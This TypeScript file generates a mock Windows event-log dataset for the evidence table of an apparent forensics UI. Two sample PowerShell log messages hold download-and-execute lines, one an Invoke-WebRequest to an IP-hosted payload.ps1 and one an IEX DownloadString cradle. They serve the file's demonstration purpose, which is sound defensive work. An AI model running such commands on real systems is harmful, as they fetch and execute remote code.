import type { EventLevel, EvtxEvent } from "@/types/evidence";

/**
 * Deterministic mock EVTX dataset for UI development (Phase 4).
 *
 * Not connected to the real parser — `src/backend/index.ts` still owns
 * the actual `parseEVTX` contract. This file exists solely so the
 * Evidence Table has realistic, varied data to demonstrate search,
 * sorting, filtering, pagination, and row selection against.
 */

interface EventTemplate {
  eventId: number;
  provider: string;
  channel: string;
  level: EventLevel;
  message: string;
}

const TEMPLATES: EventTemplate[] = [
  {
    eventId: 4624,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Information",
    message: "An account was successfully logged on.",
  },
  {
    eventId: 4625,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Warning",
    message: "An account failed to log on.",
  },
  {
    eventId: 4672,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Information",
    message: "Special privileges assigned to new logon.",
  },
  {
    eventId: 4688,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Information",
    message: "A new process has been created.",
  },
  {
    eventId: 4697,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Critical",
    message: "A service was installed in the system.",
  },
  {
    eventId: 4720,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Warning",
    message: "A user account was created.",
  },
  {
    eventId: 4732,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Warning",
    message: "A member was added to a security-enabled local group.",
  },
  {
    eventId: 1102,
    provider: "Microsoft-Windows-Eventlog",
    channel: "Security",
    level: "Critical",
    message: "The audit log was cleared.",
  },
  {
    eventId: 7045,
    provider: "Service Control Manager",
    channel: "System",
    level: "Warning",
    message: "A service was installed in the system.",
  },
  {
    eventId: 7036,
    provider: "Service Control Manager",
    channel: "System",
    level: "Information",
    message: "The Windows Defender Firewall service entered the stopped state.",
  },
  {
    eventId: 1116,
    provider: "Microsoft-Windows-Windows Defender",
    channel: "Microsoft-Windows-Windows Defender/Operational",
    level: "Critical",
    message: "Antimalware platform detected malware or other potentially unwanted software.",
  },
  {
    eventId: 4103,
    provider: "Microsoft-Windows-PowerShell",
    channel: "Microsoft-Windows-PowerShell/Operational",
    level: "Information",
    message: "Executing pipeline: Invoke-WebRequest -Uri http://185.220.101.4/payload.ps1",
  },
  {
    eventId: 4104,
    provider: "Microsoft-Windows-PowerShell",
    channel: "Microsoft-Windows-PowerShell/Operational",
    level: "Warning",
    message: "Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString(...)",
  },
  {
    eventId: 5140,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Information",
    message: "A network share object was accessed.",
  },
  {
    eventId: 5157,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Verbose",
    message: "The Windows Filtering Platform has blocked a connection.",
  },
  {
    eventId: 4634,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Information",
    message: "An account was logged off.",
  },
  {
    eventId: 6005,
    provider: "EventLog",
    channel: "System",
    level: "Information",
    message: "The Event log service was started.",
  },
  {
    eventId: 41,
    provider: "Microsoft-Windows-Kernel-Power",
    channel: "System",
    level: "Critical",
    message: "The system has rebooted without cleanly shutting down first.",
  },
];

const COMPUTERS = [
  "WKSTN-FIN-014",
  "WKSTN-HR-002",
  "DC01-CORP",
  "SRV-FILE-01",
  "SRV-SQL-02",
  "WKSTN-DEV-021",
  "LAPTOP-EXEC-07",
];

const USERS = [
  "NT AUTHORITY\\SYSTEM",
  "CORP\\jsmith",
  "CORP\\agarcia",
  "CORP\\mchen",
  "CORP\\administrator",
  "CORP\\svc-backup",
  "NT AUTHORITY\\NETWORK SERVICE",
  "CORP\\rpatel",
];

/** Small deterministic PRNG (mulberry32) so the dataset is stable across renders/reloads. */
function mulberry32(seed: number) {
  return function () {
    seed |= 0;
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function generateMockEvents(count: number): EvtxEvent[] {
  const rand = mulberry32(20260725);
  const pick = <T,>(arr: T[]) => arr[Math.floor(rand() * arr.length)];

  const now = new Date("2026-07-25T14:32:00Z").getTime();
  const events: EvtxEvent[] = [];

  for (let i = 0; i < count; i++) {
    const template = pick(TEMPLATES);
    const timestamp = new Date(now - Math.floor(rand() * 1000 * 60 * 60 * 72));

    events.push({
      id: `evt-${i.toString().padStart(5, "0")}`,
      timestamp: timestamp.toISOString(),
      eventId: template.eventId,
      provider: template.provider,
      channel: template.channel,
      level: template.level,
      computer: pick(COMPUTERS),
      user: pick(USERS),
      message: template.message,
    });
  }

  return events.sort(
    (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime(),
  );
}

export const MOCK_EVENTS: EvtxEvent[] = generateMockEvents(180);
